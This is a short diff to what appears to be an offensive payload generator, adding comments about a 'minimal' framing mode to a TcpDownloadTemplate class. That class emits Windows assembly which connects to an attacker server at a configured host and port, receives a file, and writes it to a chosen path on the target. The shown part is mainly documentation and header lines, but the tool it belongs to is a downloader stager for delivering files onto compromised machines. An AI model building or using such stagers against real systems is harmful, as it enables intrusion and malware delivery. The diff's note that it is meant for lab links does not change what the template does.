@@ -4,6 +4,10 @@ Protocol (attacker server speaks first):
   [4 bytes LE] file_size
   [file_size bytes] raw file data
 
+Framing mode: minimal. The four-byte size header is requested with one recv()
+call to reduce emitted size. TCP may return a short header, so this template is
+intended only for controlled lab links and is not a reliable transfer mode.
+
 Template sequence:
   WSAStartup -> WSASocketA -> connect -> recv(4) -> VirtualAlloc ->
   recv loop -> closesocket -> CreateFileA -> WriteFile -> CloseHandle ->
@@ -84,6 +88,7 @@ class TcpDownloadTemplate(PayloadTemplate):
             f"; Server: {config.lhost}:{config.lport}",
             f"; Writes to: {config.dst_path}",
             "; Protocol: [uint32 LE size][raw bytes]",
+            "; Framing: minimal (single recv for size header; lab use only)",
             "",
             "    ; WSAStartup(0x0202, &WSADATA)",
             f"    lea  esi, {wsadata}",
